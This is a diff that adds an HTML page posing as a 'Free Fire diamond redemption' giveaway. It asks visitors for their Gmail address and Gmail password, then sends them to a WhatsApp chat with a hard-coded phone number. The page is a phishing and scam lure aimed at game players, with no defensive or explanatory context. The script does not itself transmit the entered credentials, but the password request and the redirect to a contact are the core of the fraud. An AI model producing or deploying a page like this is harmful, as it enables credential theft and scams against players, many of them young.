@@ -1,0 +1,119 @@
+<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>FF Diamond Redemption</title>
+
+  <style>
+    body {
+      background-color: black;
+      color: green;
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 30px 10px;
+    }
+
+    h1 {
+      font-weight: bold;
+    }
+
+    #diamond {
+      font-size: 120px;
+      cursor: pointer;
+      margin: 30px 0;
+    }
+
+    #form {
+      display: none;
+      margin-top: 20px;
+    }
+
+    input, select, button {
+      display: block;
+      width: 80%;
+      max-width: 350px;
+      margin: 15px auto;
+      padding: 12px;
+      background: black;
+      color: green;
+      border: 2px solid green;
+      border-radius: 6px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    button {
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    input::placeholder {
+      color: green;
+    }
+
+    option {
+      background: black;
+      color: green;
+    }
+  </style>
+</head>
+
+<body>
+
+  <h1>Welcome to FF Diamond Redemption Site</h1>
+
+  <h2>Click diamond to get gift</h2>
+
+  <div id="diamond" onclick="showForm()">💎</div>
+
+  <div id="form">
+
+    <input
+      type="text"
+      id="gmail id"
+      placeholder="Enter gmail id"
+    >
+
+    <input
+      type="text"
+      id="gmail password "
+      placeholder="Enter ff id gmail password"
+    >
+
+    <select id="diamonds">
+      <option value="">Select Diamond Amount</option>
+      <option value="100">100 Diamonds</option>
+      <option value="200">200 Diamonds</option>
+      <option value="300">300 Diamonds</option>
+      <option value="500">500 Diamonds</option>
+      <option value="700">700 Diamonds</option>
+      <option value="1000">1000 Diamonds</option>
+    </select>
+
+    <button onclick="submitForm()">Submit</button>
+
+  </div>
+
+  <script>
+    function showForm() {
+      document.getElementById("form").style.display = "block";
+    }
+
+    function submitForm() {
+      const number = "918147141983";
+
+      const message =
+        "Hello, I want to know about the FF diamond gift.";
+
+      const whatsappURL =
+        "https://wa.me/" + number +
+        "?text=" + encodeURIComponent(message);
+
+      window.location.href = whatsappURL;
+    }
+  </script>
+
+</body>
+</html>
